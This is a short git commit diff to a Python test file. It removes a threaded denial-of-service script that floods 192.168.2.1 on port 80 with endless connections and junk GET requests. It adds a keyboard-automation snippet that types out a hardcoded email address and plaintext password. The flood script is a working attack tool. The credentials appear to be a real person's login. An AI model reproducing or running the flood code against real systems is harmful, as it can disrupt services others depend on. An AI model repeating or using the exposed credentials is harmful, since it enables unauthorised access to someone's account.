433b83cb62f7bc27f94ef6337408fc7258f62082
Mofiche <moritzenge@hotmail.de>
2019-09-27 16:13:20 +0200

    dos

--- python/Tests/test.py
+++ python/Tests/test.py
@@ -1,22 +1,8 @@
-import socket
-from threading import Thread
-
-host = "192.168.2.1"
-ip = host
-port = 80
-
-def dos():
-    while True:
-        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            mysocket.connect((ip,port))
-            mysocket.send(str.encode("GET" + "" + "HTTP/1.1 \r\n"))
-            mysocket.sendto(str.encode("GET" + "" + "HTTP/1.1 \r\n"), (ip,port))
-        except socket.error:
-            print(error)
-        mysocket.close()
-        print("dos")
-
-for i in range(12):
-    t = Thread(target=dos)
-    t.start()
+from pynput.keyboard import Controller , Key
+keyboard = Controller()
+mail = 'fkw.peter@gmx.de'
+pw = 'NETAbi2019'
+keyboard.type(mail)
+keyboard.press(Key.tab)
+keyboard.release(Key.tab)
+keyboard.type(pw)
